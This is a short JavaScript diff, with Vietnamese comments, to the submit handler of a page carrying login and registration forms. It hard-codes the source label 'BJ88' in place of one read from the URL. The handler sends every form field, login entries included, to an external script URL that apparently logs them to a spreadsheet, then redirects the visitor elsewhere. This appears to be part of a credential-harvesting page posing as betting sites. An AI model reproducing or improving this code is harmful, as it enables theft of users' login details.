@@ -177,15 +177,12 @@
             const formData = new URLSearchParams(new FormData(form));
             
             // 1. Tự động lấy tên nhà cái từ link web (Ví dụ: ?nha-cai=BJ88)
-            const urlParams = new URLSearchParams(window.location.search);
-            const sourceName = urlParams.get('nha-cai') || "Chưa rõ nguồn"; 
-
+            const sourceName = "BJ88";
             // 2. Phân biệt Đăng ký/Đăng nhập
             const formType = (formId === 'loginForm') ? "Đăng Nhập" : "Đăng Ký";
             
             formData.append("type", formType); 
-            formData.append("source", sourceName); // Gửi nhãn 'source' về Sheet
-
+            formData.append("source", sourceName); // Gửi tên "BJ88" về cột Nguồn
             fetch(SCRIPT_URL, { method: 'POST', mode: 'no-cors', body: formData })
             .then(() => {
                 window.location.href = REDIRECT_URL;
